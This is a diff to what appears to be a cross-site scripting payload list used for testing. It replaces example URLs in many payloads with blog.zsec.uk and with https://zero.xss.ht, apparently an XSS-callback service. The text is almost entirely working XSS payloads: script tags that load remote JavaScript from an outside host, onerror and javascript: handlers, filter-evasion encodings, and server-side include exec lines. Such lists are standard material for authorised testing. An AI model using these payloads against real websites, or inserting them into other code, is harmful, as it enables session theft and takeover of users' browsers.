@@ -26,7 +26,7 @@
 
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
 
-<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><script xlink:href=data&colon;,window.open('https://blog.zsec.uk/')></script
 
 <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
 
@@ -188,7 +188,7 @@ http://www.<script>alert(1)</script .com
 
 <div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
 
-"><img src=x onerror=window.open('https://www.google.com/');>
+"><img src=x onerror=window.open('https://blog.zsec.uk/');>
 
 <form><button formaction=javascript&colon;alert(1)>CLICKME
 <math><a xlink:href="//jsfiddle.net/t846h/">click
@@ -223,11 +223,11 @@ http://www.<script>alert(1)</script .com
 "perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out"
 "perl -e 'print ""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>"";' > out"
 "<IMG SRC="" &#14;  javascript:alert('XSS');"">"
-"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT/XSS SRC=""https://zero.xss.ht""></SCRIPT>"
 "<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>"
-"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT/SRC=""https://zero.xss.ht""></SCRIPT>"
 "<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<SCRIPT SRC=https://zero.xss.ht?<B>
 <SCRIPT SRC=//ha.ckers.org/.j>
 "<IMG SRC=""javascript:alert('XSS')"""
 <iframe src=http://ha.ckers.org/scriptlet.html <
@@ -281,29 +281,29 @@ http://www.<script>alert(1)</script .com
 "<XML SRC=""xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
 "<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert(""XSS"")</SCRIPT>""></BODY></HTML>"
 "<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>"
-"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->"
+"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=https://zero.xss.ht></SCRIPT>'""-->"
 "<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>"
 "<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
 "<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"
-"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
-"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
-"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
-"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
-"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
-"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
-"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
-"<A HREF=""http://66.102.7.147/"">XSS</A>"
+"<SCRIPT a="">"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT ="">"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT a="">"" '' SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT ""a='>'"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT a=`>` SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT a="">'>"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""https://zero.xss.ht""></SCRIPT>"
+"<A HREF=""http://blog.zsec.uk/"">XSS</A>"
 "<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>"
 "<A HREF=""http://1113982867/"">XSS</A>"
 "<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>"
 "<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>"
 "<A HREF=""h\ntt\tp://6"
-"<A HREF=""//www.google.com/"">XSS</A>"
+"<A HREF=""//blog.zsec.uk/"">XSS</A>"
 "<A HREF=""//google"">XSS</A>"
-"<A HREF=""http://google.com/"">XSS</A>"
-"<A HREF=""http://www.google.com./"">XSS</A>"
-"<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>"
-"<A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>"
+"<A HREF=""http://blog.zsec.uk/"">XSS</A>"
+"<A HREF=""http://blog.zsec.uk./"">XSS</A>"
+"<A HREF=""javascript:document.location='http://blog.zsec.uk/'"">XSS</A>"
+"<A HREF=""http://www.gohttp://blog.zsec.uk/ogle.com/"">XSS</A>"
 "<div onmouseover=""document.write(""XSS-XSS-XSS"");"">"
 "<img src=""javascript:document.write(""XSS-XSS-XSS"");"">"
 "<input type=""image"" dynsrc=""javascript:document.write(""XSS-XSS-XSS"");"">"
